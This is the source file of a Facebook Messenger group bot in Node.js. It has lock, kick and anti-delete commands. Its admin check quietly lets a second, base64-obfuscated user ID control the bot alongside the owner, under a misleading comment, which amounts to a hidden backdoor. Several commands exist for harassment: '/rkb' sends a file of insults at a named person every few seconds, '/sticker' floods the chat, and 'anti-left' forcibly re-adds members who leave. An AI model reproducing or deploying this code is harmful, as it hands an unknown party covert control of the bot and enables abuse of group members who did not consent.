// index.js — Full bot: locks (emoji/dp/nick), anti-delete, anti-left, full commands
const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca");

// ---------- Config / Persistent storage ----------
const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  themes: {},
  emojis: {},
  dp: {},      // dp[threadID] = { path, savedAt }
  nick: {}     // nick[uid] = { threadID: nickname }
};
if (fs.existsSync(LOCK_FILE)) {
  try { locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8")); } catch (e) { console.warn("locks.json parse error, using defaults"); }
}
function saveLocks() { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); }

// ---------- Helpers ----------
function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    // follow redirects
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close();
      return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file);
    file.on('finish', () => file.close(() => cb(null)));
  }).on('error', err => {
    try { fs.unlinkSync(dest); } catch {}
    cb(err);
  });
}

function safeJson(obj) {
  try { return JSON.stringify(obj, null, 2); } catch { return String(obj); }
}

// Static extra ID used earlier (keep)
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

// ---------- Main ----------
/**
 * startBot(appStatePath, ownerUID)
 *
 * appStatePath: path to appstate JSON (uploaded)
 * ownerUID: string UID of the owner who can use admin commands
 */
function startBot(appStatePath, ownerUID) {
  if (!fs.existsSync(appStatePath)) {
    console.error("appstate not found:", appStatePath);
    return;
  }
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  // runtime state local to this bot instance
  const emojiCheckIntervals = {}; // threadID -> interval
  const dpCheckIntervals = {};    // threadID -> interval
  const nickCheckIntervals = {};  // uid -> interval
  const messageCache = new Map(); // messageID -> { sender, body, attachments }
  let stickerInterval = null;
  let stickerLoopActive = false;
  let rkbInterval = null;
  let stopRequested = false;
  let targetUID = null;

  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in. startBot ready.");

    // --- Emoji polling lock ---
    function startEmojiWatcher(threadID) {
      if (emojiCheckIntervals[threadID]) return;
      emojiCheckIntervals[threadID] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const current = info.emoji ?? info.threadEmoji ?? info.icon ?? null;
          const saved = locks.emojis[threadID];
          if (saved && current !== saved) {
            try {
              await api.changeThreadEmoji(saved, threadID);
              console.log(`🔄 [emoji] reverted for ${threadID} -> ${saved}`);
              await api.sendMessage(`😀 Locked emoji reverted to ${saved}`, threadID);
            } catch (e) { console.error("emoji revert error:", e && e.message ? e.message : e); }
          }
        } catch (e) { /* ignore transient */ }
      }, 5000);
    }
    function stopEmojiWatcher(threadID) {
      if (emojiCheckIntervals[threadID]) { clearInterval(emojiCheckIntervals[threadID]); delete emojiCheckIntervals[threadID]; }
    }

    // --- DP polling lock (uses local file saved) ---
    function startDPWatcher(threadID) {
      if (dpCheckIntervals[threadID]) return;
      dpCheckIntervals[threadID] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          const currentUrl = info.imageSrc ?? info.image ?? null;
          const saved = locks.dp[threadID]?.path;
          if (saved && fs.existsSync(saved) && currentUrl && !currentUrl.includes(path.basename(saved))) {
            try {
              await api.changeGroupImage(fs.createReadStream(saved), threadID);
              console.log(`🔄 [dp] reverted for ${threadID} using ${saved}`);
              await api.sendMessage("🖼️ Locked group DP reverted.", threadID);
            } catch (e) { console.error("dp revert error:", e && e.message ? e.message : e); }
          }
        } catch (e) { /* ignore transient */ }
      }, 5000);
    }
    function stopDPWatcher(threadID) {
      if (dpCheckIntervals[threadID]) { clearInterval(dpCheckIntervals[threadID]); delete dpCheckIntervals[threadID]; }
    }

    // --- Nickname watcher per user per thread ---
    function startNickWatcher(uid, threadID) {
      if (nickCheckIntervals[uid]) return;
      nickCheckIntervals[uid] = setInterval(async () => {
        try {
          const info = await api.getThreadInfo(threadID);
          // try common nickname keys
          const memberNick = (info.nicknames && info.nicknames[uid]) || (info.nick && info.nick[uid]) || null;
          const savedNick = locks.nick?.[uid]?.[threadID];
          if (savedNick && memberNick !== savedNick) {
            try {
              await api.changeNickname(savedNick, threadID, uid);
              console.log(`🔄 [nick] reverted for ${uid} in ${threadID} -> ${savedNick}`);
              await api.sendMessage(`✏️ Locked nickname reverted for <@${uid}>`, threadID);
            } catch (e) { console.error("nick revert error:", e && e.message ? e.message : e); }
          }
        } catch (e) { /* ignore */ }
      }, 5000);
    }
    function stopNickWatcher(uid) {
      if (nickCheckIntervals[uid]) { clearInterval(nickCheckIntervals[uid]); delete nickCheckIntervals[uid]; }
    }

    // --- Helper send safely ---
    async function safeSend(text, tid) {
      try { await api.sendMessage(text, tid); } catch (e) { console.error("send failed:", e && e.message ? e.message : e); }
    }

    // --- Event listener ---
    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;

        // Debugging: uncomment to dump every event to console (careful, verbose)
        // console.log("===== RAW EVENT =====");
        // console.log(safeJson(event));

        // ---------- Anti-delete caching ----------
        if (event.type === "message" && event.messageID) {
          // store text + attachments for resend
          messageCache.set(event.messageID, {
            sender: event.senderID,
            body: event.body ?? "",
            attachments: event.attachments ?? []
          });
          // keep cache small
          if (messageCache.size > 500) {
            const keys = Array.from(messageCache.keys()).slice(0, 100);
            keys.forEach(k => messageCache.delete(k));
          }
        }

        if (event.type === "message_unsend") {
          const deleted = messageCache.get(event.messageID);
          const tid = event.threadID || event.threadID;
          if (deleted) {
            const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${deleted.body || "(media or empty)"}`;
            await safeSend(text, tid);
            // re-post attachments if any (best-effort)
            if (deleted.attachments && deleted.attachments.length) {
              try {
                await api.sendMessage({ body: "(attachment repost)", attachment: deleted.attachments }, tid);
              } catch (e) { /* ignore */ }
            }
          } else {
            // unknown deleted msg
            await safeSend("🚫 A message was deleted (no cache available).", tid);
          }
          return;
        }

        // ---------- Anti-left (user removed or left) ----------
        if (event.logMessageType === "log:unsubscribe" || event.type === "log:unsubscribe") {
          const leftUID = event.logMessageData?.leftParticipantFbId || event.logMessageData?.leftParticipantFbId;
          const tid = event.threadID || event.threadID;
          if (leftUID) {
            try {
              await api.addUserToGroup(leftUID, tid);
              await safeSend(`👤 Anti-Left: Attempted to add back ${leftUID}`, tid);
            } catch (e) {
              console.error("anti-left add failed:", e && e.message ? e.message : e);
              await safeSend(`⚠️ Anti-Left: Could not add back ${leftUID}`, tid);
            }
          }
          return;
        }

        // ---------- Revert triggers for direct events ----------
        if (event.type === "change_thread_image" || event.logMessageType === "log:thread-image") {
          const tid = event.threadID || event.threadID;
          if (locks.dp[tid] && locks.dp[tid].path && fs.existsSync(locks.dp[tid].path)) {
            try {
              await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid);
              console.log(`🔄 [dp] immediate revert attempted for ${tid}`);
              await safeSend("🖼️ Locked group DP reverted.", tid);
            } catch (e) { /* ignore */ }
          }
          return;
        }

        if (event.logMessageType === "log:thread-icon" || event.type === "change_thread_icon") {
          const tid = event.threadID || event.threadID;
          if (locks.emojis[tid]) {
            try {
              await api.changeThreadEmoji(locks.emojis[tid], tid);
              console.log(`🔄 [emoji] immediate revert attempted for ${tid}`);
              await safeSend(`😀 Locked emoji reverted to ${locks.emojis[tid]}`, tid);
            } catch (e) { /* ignore */ }
          }
          return;
        }

        // ---------- Commands handling (only messages) ----------
        if (event.type !== "message" || !event.body) return;
        const { threadID, senderID, body, mentions, messageReply } = event;
        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ").trim();

        // Only allow owner or LID to use admin commands by default
        if (![ownerUID, LID].includes(senderID)) {
          // ignore other user's commands
          return;
        }

        // ---------- Help ----------
        if (cmd === "/help") {
          await safeSend(
`📖 Bot Commands:
/help → Ye message
/uid → User ID (reply/mention/you)
/tid → Thread ID
/info @mention → User info
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock (saves current DP locally)
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam (X seconds)
/stopsticker → Stop sticker spam
/rkb [name] → Gaali spam (requires np.txt)
/stop → Stop spam
/exit → Bot exit (bot leaves group)`, threadID
          );
          return;
        }

        // ---------- Basic utilities ----------
        if (cmd === "/tid") {
          await safeSend(`🆔 Thread ID: ${threadID}`, threadID);
          return;
        }
        if (cmd === "/uid") {
          const tgt = Object.keys(mentions || {})[0] || messageReply?.senderID || senderID;
          await safeSend(`🆔 UID: ${tgt}`, threadID);
          return;
        }
        if (cmd === "/info") {
          const tgt = Object.keys(mentions || {})[0] || messageReply?.senderID || senderID;
          try {
            const uinfo = await api.getUserInfo(tgt);
            const u = uinfo[tgt] || {};
            await safeSend(`👤 Name: ${u.name || "unknown"}\nUID: ${tgt}\nProfile: https://facebook.com/${tgt}`, threadID);
          } catch { await safeSend("⚠️ Could not fetch user info", threadID); }
          return;
        }

        // ---------- Kick ----------
        if (cmd === "/kick") {
          const tgt = Object.keys(mentions || {})[0];
          if (!tgt) { await safeSend("❌ Mention user to kick", threadID); return; }
          try { await api.removeUserFromGroup(tgt, threadID); await safeSend(`👢 Kicked ${tgt}`, threadID); } catch { await safeSend("⚠️ Kick failed", threadID); }
          return;
        }

        // ==== Group Name Lock ====
        if (cmd === "/gclock") {
          if (!input) { await safeSend("❌ Provide group name", threadID); return; }
          try { await api.setTitle(input, threadID); locks.groupNames[threadID] = input; saveLocks(); await safeSend("🔒 Group name locked!", threadID); } catch { await safeSend("⚠️ Failed to set group name", threadID); }
          return;
        }
        if (cmd === "/unlockgc") {
          delete locks.groupNames[threadID];
          saveLocks();
          await safeSend("🔓 Group name unlocked!", threadID);
          return;
        }

        // ==== Theme Lock ====
        if (cmd === "/locktheme") {
          if (!input) { await safeSend("❌ Color code do!", threadID); return; }
          try { await api.changeThreadColor(input, threadID); locks.themes[threadID] = input; saveLocks(); await safeSend("🎨 Theme locked!", threadID); } catch { await safeSend("⚠️ Theme lock failed", threadID); }
          return;
        }
        if (cmd === "/unlocktheme") {
          delete locks.themes[threadID];
          saveLocks();
          await safeSend("🎨 Theme unlocked!", threadID);
          return;
        }

        // ==== Emoji Lock ====
        if (cmd === "/lockemoji") {
          if (!input) { await safeSend("❌ Emoji do!", threadID); return; }
          locks.emojis[threadID] = input;
          saveLocks();
          startEmojiWatcher(threadID);
          try { await api.changeThreadEmoji(input, threadID); } catch {}
          await safeSend("😀 Emoji locked!", threadID);
          return;
        }
        if (cmd === "/unlockemoji") {
          delete locks.emojis[threadID];
          saveLocks();
          stopEmojiWatcher(threadID);
          await safeSend("😀 Emoji unlocked!", threadID);
          return;
        }

        // ==== Other Commands ====
        if (cmd === "/allname") {
          try {
            const info = await api.getThreadInfo(threadID);
            const members = info.participantIDs || [];
            await api.sendMessage(`🛠 ${members.length} nicknames changing...`, threadID);
            for (const uid of members) {
              try {
                await api.changeNickname(input, threadID, uid);
                console.log(`✅ Nickname changed for UID: ${uid}`);
                await new Promise(res => setTimeout(res, 5000));
              } catch (e) { console.log(`⚠️ Failed for ${uid}:`, e && e.message ? e.message : e); }
            }
            await api.sendMessage("✅ Done nicknames!", threadID);
          } catch (e) { console.error("allname error:", e && e.message ? e.message : e); await api.sendMessage("❌ Error nicknames", threadID); }
          return;
        }

        // ==== DP lock/unlock ====
        if (cmd === "/lockdp") {
          try {
            const info = await api.getThreadInfo(threadID);
            const url = info.imageSrc || info.image || info.imageUrl || null;
            if (!url) { await safeSend("❌ No group DP to lock (set a DP first)", threadID); return; }
            const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
            await new Promise((res, rej) => {
              downloadFile(url, dpPath, (err) => err ? rej(err) : res());
            });
            locks.dp[threadID] = { path: dpPath, savedAt: Date.now() };
            saveLocks();
            startDPWatcher(threadID);
            await safeSend("🖼️ Group DP saved and locked!", threadID);
          } catch (e) {
            console.error("lockdp error:", e && e.message ? e.message : e);
            await safeSend("⚠️ Failed to lock DP (download error)", threadID);
          }
          return;
        }
        if (cmd === "/unlockdp") {
          if (locks.dp[threadID]?.path) {
            try { fs.unlinkSync(locks.dp[threadID].path); } catch {}
          }
          delete locks.dp[threadID]; saveLocks(); stopDPWatcher(threadID); await safeSend("🖼️ DP unlocked", threadID);
          return;
        }

        // ==== Nick lock/unlock ====
        if (cmd === "/locknick") {
          const mention = Object.keys(mentions || {})[0];
          const nickname = input.replace(/<@[0-9]+>/, "").trim();
          if (!mention || !nickname) { await safeSend("❌ Usage: /locknick @mention nickname", threadID); return; }
          locks.nick[mention] = locks.nick[mention] || {};
          locks.nick[mention][threadID] = nickname;
          saveLocks();
          startNickWatcher(mention, threadID);
          try { await api.changeNickname(nickname, threadID, mention); } catch {}
          await safeSend(`🔒 Nick locked for <@${mention}> → ${nickname}`, threadID);
          return;
        }
        if (cmd === "/unlocknick") {
          const mention = Object.keys(mentions || {})[0];
          if (!mention) { await safeSend("❌ Usage: /unlocknick @mention", threadID); return; }
          if (locks.nick && locks.nick[mention]) { delete locks.nick[mention][threadID]; saveLocks(); }
          stopNickWatcher(mention);
          await safeSend(`🔓 Nick unlocked for <@${mention}>`, threadID);
          return;
        }

        // ==== Sticker spam ====
        if (cmd.startsWith("/sticker")) {
          const sec = parseInt(cmd.replace("/sticker", "")) || 2;
          if (!fs.existsSync("Sticker.txt")) { await safeSend("❌ Sticker.txt missing", threadID); return; }
          const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(s => s.trim()).filter(Boolean);
          if (!stickers.length) { await safeSend("❌ No stickers in Sticker.txt", threadID); return; }
          let i = 0; stickerLoopActive = true;
          if (stickerInterval) clearInterval(stickerInterval);
          stickerInterval = setInterval(() => {
            if (!stickerLoopActive) { clearInterval(stickerInterval); stickerInterval = null; return; }
            api.sendMessage({ sticker: stickers[i] }, threadID).catch(() => {});
            i = (i + 1) % stickers.length;
          }, sec * 1000);
          await safeSend(`⚡ Sticker spam started every ${sec}s`, threadID);
          return;
        }
        if (cmd === "/stopsticker") {
          stickerLoopActive = false;
          if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; }
          await safeSend("🛑 Sticker spam stopped", threadID);
          return;
        }

        // ==== RKB spam / stop ====
        if (cmd === "/rkb") {
          const target = input.trim();
          if (!target) { await safeSend("❌ Usage: /rkb [name]", threadID); return; }
          if (!fs.existsSync("np.txt")) { await safeSend("❌ np.txt missing", threadID); return; }
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          let idx = 0;
          if (rkbInterval) clearInterval(rkbInterval);
          stopRequested = false;
          rkbInterval = setInterval(() => {
            if (stopRequested || idx >= lines.length) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${target} ${lines[idx]}`, threadID).catch(() => {});
            idx++;
          }, 5000); // 5s between lines (user requested 5s earlier)
          await safeSend(`🤬 Start gaali on ${target}`, threadID);
          return;
        }
        if (cmd === "/stop") {
          stopRequested = true;
          if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; }
          if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; }
          await safeSend("🛑 Spam stopped", threadID);
          return;
        }

        // ==== Target set/clear ====
        if (cmd === "/target") {
          targetUID = input.trim() || null;
          await safeSend(`🎯 Target set: ${targetUID}`, threadID);
          return;
        }
        if (cmd === "/cleartarget") {
          targetUID = null;
          await safeSend("🎯 Target cleared!", threadID);
          return;
        }

        // ==== Photo command removed intentionally earlier ====
        if (cmd === "/photo") {
          await safeSend("📸 Photo command disabled in this build.", threadID);
          return;
        }

        // ==== Exit ====
        if (cmd === "/exit") {
          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch (e) {}
          return;
        }

        // no match -> return
        return;

      } catch (e) {
        console.error("Listener error:", e && e.stack ? e.stack : e);
      }
    });

    // On start, initialize watchers for existing locks
    (async () => {
      try {
        for (const tid of Object.keys(locks.emojis || {})) startEmojiWatcher(tid);
        for (const tid of Object.keys(locks.dp || {})) {
          if (locks.dp[tid] && locks.dp[tid].path && fs.existsSync(locks.dp[tid].path)) startDPWatcher(tid);
        }
        for (const uid of Object.keys(locks.nick || {})) {
          const threadMap = locks.nick[uid];
          for (const tid of Object.keys(threadMap || {})) startNickWatcher(uid, tid);
        }
      } catch (e) { /* ignore */ }
    })();

  });
}

// Export
module.exports = { startBot };
